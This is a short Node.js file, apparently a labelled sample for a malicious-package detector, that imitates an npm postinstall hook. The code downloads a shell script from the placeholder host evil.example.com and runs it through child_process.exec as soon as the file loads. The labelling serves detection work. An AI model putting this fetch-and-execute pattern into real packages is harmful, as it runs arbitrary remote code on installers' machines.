// Malicious: postinstall script — fetches a payload over HTTPS then executes it
// Pattern: NetworkRequest + ProcessExec triggered from install lifecycle hook
const { exec } = require('child_process');
const https = require('https');

function fetchAndRun() {
    https.get('https://evil.example.com/payload.sh', function(res) {
        let body = '';
        res.on('data', function(chunk) { body += chunk; });
        res.on('end', function() {
            exec(body.trim());
        });
    });
}

fetchAndRun();
